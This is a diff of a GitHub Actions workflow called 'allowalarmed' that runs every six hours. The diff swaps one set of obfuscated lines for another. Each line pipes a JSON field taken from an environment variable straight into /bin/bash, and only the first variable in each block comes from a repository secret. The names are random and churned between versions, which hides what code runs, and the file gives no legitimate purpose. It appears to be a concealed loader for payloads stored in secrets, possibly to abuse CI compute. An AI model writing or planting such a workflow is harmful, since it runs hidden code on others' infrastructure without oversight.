@@ -2,30 +2,30 @@ name: allowalarmed
 on:
   workflow_dispatch:
   schedule:
-    - cron: '52 1/6 * * *'
-
-jobs:  # 25357
+    - cron: '58 4/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: allowalarmed
         env:
-          m7: ${{ secrets.m7 }}
+          yrl2: ${{ secrets.yrl2 }}
         run: |
-          echo $m7 | jq -r .twdy75 | /bin/bash
-          echo $we30756 | jq -r .ui8456 | /bin/bash
-          echo $t20300 | jq -r .qwnph924 | /bin/bash
-          echo $rxmbw271 | jq -r .nxz32681 | /bin/bash
-          echo $q2 | jq -r .qtb6 | /bin/bash
-          echo $uasuk8 | jq -r .q498 | /bin/bash
-          echo $g2 | jq -r .kou15390 | /bin/bash
-          echo $np5379 | jq -r .is21376 | /bin/bash
-          echo $e67 | jq -r .tch27 | /bin/bash
-          echo $ijnof9 | jq -r .dkjd71 | /bin/bash
-          echo $zxfuh6045 | jq -r .uwv126 | /bin/bash
-          echo $vfm8 | jq -r .u776 | /bin/bash
-          echo $jh0 | jq -r .q5114 | /bin/bash
-          echo $h671 | jq -r .ghydm33156 | /bin/bash
-          echo $ip093 | jq -r .fncvs10693 | /bin/bash
+          echo $yrl2 | jq -r .o0 | /bin/bash
+          echo $igbfq9678 | jq -r .ipl99 | /bin/bash
+          echo $pecv99 | jq -r .b8 | /bin/bash
+          echo $y9 | jq -r .v94 | /bin/bash
+          echo $jp9 | jq -r .fuo840 | /bin/bash
+          echo $euy01049 | jq -r .elzkd251 | /bin/bash
+          echo $yxthn57927 | jq -r .c29 | /bin/bash
+          echo $g0 | jq -r .a47540 | /bin/bash
+          echo $we4 | jq -r .ls6 | /bin/bash
+          echo $ntyd9711 | jq -r .sqher1789 | /bin/bash
+          echo $dem14 | jq -r .x2 | /bin/bash
+          echo $bjyms99 | jq -r .co8652 | /bin/bash
+          echo $sp17398 | jq -r .hxhtv880 | /bin/bash
+          echo $daol8506 | jq -r .aouil35 | /bin/bash
+          echo $dwwy5379 | jq -r .xlgm9 | /bin/bash
 
